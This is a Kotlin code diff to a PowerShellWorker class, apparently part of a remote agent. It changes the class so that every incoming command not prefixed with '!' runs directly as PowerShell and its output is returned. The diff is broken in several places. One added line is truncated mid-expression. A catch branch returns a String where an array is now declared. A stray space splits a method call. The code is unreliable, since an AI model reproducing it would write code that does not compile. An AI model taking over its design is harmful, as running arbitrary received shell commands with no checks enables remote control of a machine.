@@ -28,23 +28,20 @@ class PowerShellWorker(private val agent : Agent) : Runnable{
         queue.add(parseCommand(cmd))
 
     }
-    private fun executePowerShell(command: Command) : String {
+    private fun executePowerShell(command: Command) : Array<String> {
         return try {
             val response : PowerShellResponse = ps.executeCommand(command.cmd)
-            response.commandOutput
+            arrayOf(response.commandOutput.split(" ").to
         } catch (ex : PowerShellNotAvailableException) {
             "NO_PSH: $ex"
         }
     }
 
     private fun handleCommand(command : Command) : Command {
-        return when(command.commandType) {
-            CommandType.CALL_POWERSHELL -> Command(executePowerShell(command), CommandType.RESPONSE_POWERSHELL)
-            CommandType.CALL_AGENT -> Command(handleAgentCommand(command),CommandType.RESPONSE_AGENT)
-            else -> {
-                //todo handle unknown
-                Command("UNKNOWN_COMMAND",CommandType.UNKNOWN)
-            }
+
+        return when(command.cmd.startsWith("!")) {
+            true -> Command(handleAgentCommand(command),CommandType.RESPONSE_AGENT)
+            false -> Command(executePowerShell(command), CommandType.RESPONSE_POWERSHELL)
         }
     }
     private fun handleAgentCommand(command: Command) : String {
@@ -72,7 +69,7 @@ class PowerShellWorker(private val agent : Agent) : Runnable{
         var cmdType = CommandType.UNKNOWN
         var data = ""
         try {
-            cmdType = CommandType.valueOf(cmd.substringAfterLast(":").trim())
+            cmdType = CommandType.valueOf(cmd. substringAfterLast(":").trim())
             data = cmd.substring(cmd.indexOf("CMD:") + 4, cmd.indexOf("TYPE:") - 1)
         } catch (ex: IllegalArgumentException) {
             // TODO logging
